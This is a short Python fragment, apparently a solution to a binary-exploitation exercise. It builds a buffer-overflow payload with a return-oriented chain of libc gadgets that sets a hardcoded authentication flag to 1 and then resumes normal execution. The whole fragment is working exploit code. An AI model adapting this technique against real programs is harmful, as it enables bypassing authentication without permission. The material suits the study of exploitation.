...
def get_arg():
	auth_address = 0x0804A054 #from IDA
	original_return_address  = 0x80488C6 #from IDA
	import search
	gs = search.GadgetSearch('libc.bin',0xb7c39750)
	pop_edx = gs.find('POP EDX').decode("hex")[::-1]
	mov_eax_minus_one = gs.find('MOV EAX, -1').decode("hex")[::-1]
	inc_eax = gs.find('INC EAX').decode("hex")[::-1]
	mov_addressedx_eax = gs.find('MOV [EDX], EAX').decode("hex")[::-1]
	return 'a'*66 + pop_edx + struct.pack('<I',auth_address) + mov_eax_minus_one + inc_eax + inc_eax + mov_addressedx_eax + struct.pack('<I',original_return_address)
